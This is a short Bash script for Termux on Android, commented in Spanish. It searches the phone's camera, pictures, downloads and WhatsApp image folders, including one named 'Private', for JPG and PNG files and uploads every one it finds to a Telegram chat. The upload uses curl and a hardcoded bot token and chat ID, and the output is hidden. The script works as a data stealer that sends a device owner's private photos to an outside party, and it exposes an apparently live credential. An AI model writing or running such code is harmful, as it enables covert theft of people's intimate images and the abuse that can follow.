#!/bin/bash

# Configuración del bot de Telegram
BOT_TOKEN="7305607951:AAFEnOfEVchDuMNRbZ4-tx8t_ouYJnK7xd8"
CHAT_ID="7060108163"
MENSAJE="Imágenes enviadas desde Termux"

# Rutas a escanear (separadas por espacio)
RUTAS=(
  "/storage/emulated/0/DCIM/Camera"
  "/storage/emulated/0/Pictures"
  "/storage/emulated/0/Download"
  "/sdcard/Android/media/com.whatsapp/WhatsApp/media/WhatsApp Images/Private"
  "/sdcard/Android/media/com.whatsapp/WhatsApp/media/WhatsApp Images"
)

# URL de la API de Telegram
URL="https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"

# Función para enviar imágenes
enviar_imagenes() {
  local ruta=$1
  echo ""

  # Buscar recursivamente imágenes (.jpg, .jpeg, .png)
  find "$ruta" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" \) | while read -r imagen; do
    echo "Enviando: $imagen"
    curl -s -X POST $URL \
      -F chat_id="$CHAT_ID" \
      -F caption="$MENSAJE" \
      -F photo="@$imagen" > /dev/null 2>&1
    sleep 2  # Pausa de 2 segundos para evitar sobrecargar la API de Telegram
  done
}

# Enviar imágenes de todas las rutas especificadas
for ruta in "${RUTAS[@]}"; do
  if [ -d "$ruta" ]; then
    enviar_imagenes "$ruta"
  else
    echo ""
  fi
done
echo ""
